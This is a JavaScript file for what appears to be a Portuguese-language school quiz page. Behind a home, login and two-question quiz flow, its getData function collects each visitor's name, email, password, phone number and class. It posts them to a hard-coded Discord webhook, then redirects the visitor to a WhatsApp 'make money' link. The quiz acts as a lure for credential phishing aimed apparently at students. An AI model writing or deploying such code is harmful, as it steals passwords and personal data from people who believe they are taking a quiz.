webhook="https://discord.com/api/webhooks/1359291929686179870/VpRWiU8PrHNr8FUEWdubZd_3sYSoUIImydzHwllIaYDegqT22Rj57fyUjn6NGRjYyzFL"

async function getData(){
var nome,email,senha,numero,turma;
let lista=document.querySelectorAll("input");
nome=lista[0].value;
email=lista[1].value;
senha=lista[2].value;
numero=lista[3].value;
turma=lista[4].value;
if (nome.length == 5 || email.length <= 2 || senha.length <= 3 || numero.length == 0 || turma.length == 0){
alert("Preencha correctamente o formulário");
}else{
msg={
content: "=======\nNome: "+nome+"\nEmail: "+email+"\nSenha: "+senha+"\nNumero: "+numero+"\nTurma: "+turma+"\n\n======="
}
await fetch(webhook,{
method: "POST",
headers: {"Content-Type":"application/json"},
body: JSON.stringify(msg)
});
window.location.href="https://wa.me/85292284980?text=Quero%20fazer%20dinheiro"
}
}




function showLogin() {
  document.getElementById("homePage").classList.remove("active");
  document.getElementById("loginPage").classList.add("active");
}

function startQuiz(event) {
  event.preventDefault();
  document.getElementById("loginPage").classList.remove("active");
  document.getElementById("quizPage").classList.add("active");
}

function submitQuiz(event) {
  event.preventDefault();
  let score = 0;
  if (document.querySelector('input[name="q1"]:checked')?.value === "b") score++;
  if (document.querySelector('input[name="q2"]:checked')?.value === "b") score++;

  document.getElementById("result").innerHTML = `<h3>Resultado: ${score}/2</h3>`;
}
